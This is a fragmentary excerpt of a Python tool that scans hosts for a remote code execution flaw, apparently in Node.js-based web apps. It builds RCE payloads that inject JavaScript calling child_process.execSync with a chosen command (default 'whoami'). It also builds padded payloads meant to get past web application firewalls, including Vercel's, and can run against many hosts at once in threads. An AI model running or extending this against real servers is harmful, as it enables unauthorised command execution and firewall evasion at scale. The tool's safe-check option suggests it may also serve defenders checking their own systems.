...
def build_vercel_waf_bypass_payload() -> tuple[str, str]:
    ...
    part0 = (
        ...
        '"var res=process.mainModule.require(\'child_process\').execSync(\'whoami\').toString().trim();;'
...
def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, command: str = "whoami") -> tuple[str, str]:
...
Examples:
  ...
  %(prog)s -u https://example.com --path-file paths.txt
    ...
    if len(hosts) == 1:
        result = check_vulnerability(hosts[0], timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size, vercel_waf_bypass=args.vercel_waf_bypass, paths=paths, command=args.command)
        ...
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(check_vulnerability, host, timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size, vercel_waf_bypass=args.vercel_waf_bypass, paths=paths, command=args.command): host
                for host in hosts
            }
